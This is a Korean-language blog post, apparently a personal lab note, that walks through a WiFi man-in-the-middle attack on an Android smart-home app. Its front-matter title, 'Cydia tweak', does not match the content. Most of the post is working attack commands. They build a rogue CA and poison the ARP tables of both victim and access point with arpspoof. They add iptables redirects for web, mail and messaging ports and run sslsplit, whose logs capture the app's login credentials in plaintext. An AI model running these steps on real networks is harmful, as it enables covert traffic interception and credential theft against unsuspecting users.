---
layout: post
title:  "Cydia tweak"
tags: IOS Mobile hacking
---



# WiFi Spoofing + SSL Strip

Created: 2022년 6월 19일 오후 3:34
Tags: wifi

## 환경 구성

- Kali Linux 2019.2 (VMware)
- Android
- USB Type 무선 랜카드 ipTIME A1000UA-4dBi
- 무선 AP ipTIME N904ns
- WallPad

<aside>
💡 kali 2020부터 ARP Spoofing 도구가 기본으로 설치되지 않음

</aside>

```bash
$ apt-get install dsniff
$ apt-get install fragrouter
```

## SSL strip을 위한 CA 인증서 작성

openSSL을 이용해 CA 인증서 작성

```bash
$ openssl genrsa -out ca.key 4096
$ openssl req -new -x509 -days 3560 -key ca.key -out ca.crt
```

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled.png)

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%201.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%201.png)

## IP 포워딩 및 라우팅 설정

1. IP 포워딩 설정

IP 포워딩 설정으로 다른 클라이언트에서 오는 패킷을 kali를 통해 전달

```bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward

or

$ sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

2. 라우팅 설정

iptables 명령으로 80(http), 443(https) 포트를 SSL Strip을 수행하기 위한 포트로 라우팅

```bash
[규칙 확인]
$ iptables -t nat -L

[전체 규칙 삭제]
$ iptables -t nat -F

[규칙 추가]
// HTTP 및 HTTPS 라우팅
$ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
$ iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

// SMTP, IMAP, messaging (필요 시 추가)
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 # (STARTTLS SMTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 # (SSL SMTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 # (SSL IMAP connections)
iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080 # (messaging connections)
```

## ARP Spoofing + SSL strip

1. Android의 MAC주소 확인

kali에서 Android에 ping을 보낸 후 arp로 MAC주소를 확인

```bash
$ ping [victim ip]
$ arp -a
```

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%202.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%202.png)

2. Android를 대상으로 ARP Spoofing 공격 시도

Android의 arp 테이블 내 존재하는 무선 AP의 MAC 주소를 공격자의 MAC 주소로 변경

```bash
$ arpspoof -i [wifi interface] -t [Victim ip] [AP ip]

[ex]
$ arpspoof -i wlan0 -t 192.168.0.6 192.168.0.1
```

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%203.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%203.png)

3. 무선 AP를 대상으로 ARP Spoofing 공격 시도

무선 AP의 arp 테이블 내 존재하는 Android의 MAC 주소를 공격자의 MAC주소로 변경

```bash
$ arpspoof -i [wifi interface] -t [AP ip] [Victim ip]

[ex]
$ arpspoof -i wlan0 -t 192.168.0.1 192.168.0.6
```

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%204.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%204.png)

4. SSL Strip 수행

sslsplit를 이용해 SSL Strip을 수행

```bash
$ mkdir /home/kali/Desktop/ssls/sslsplit
$ mkdir logdir
$ sslsplit -D -l connections.log -j /home/kali/Desktop/ssls/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
```

5. Android에서 임의의 기능 동작

Android 스마트홈 앱에서 로그인을 시도

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%205.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%205.png)

6. SSL Strip 패킷 확인

로그인 시도 시 특정 IP의 https 통신을 확인

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%206.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%206.png)

logdir 디렉토리 내 로그에서 로그인 시 입력한 계정이 평문으로 노출되는 것을 확인

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%207.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%207.png)

![WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%208.png](WiFi%20Spoofing%20+%20SSL%20Strip%20bc5eb5a756ee4e61b7217fccf688da0b/Untitled%208.png)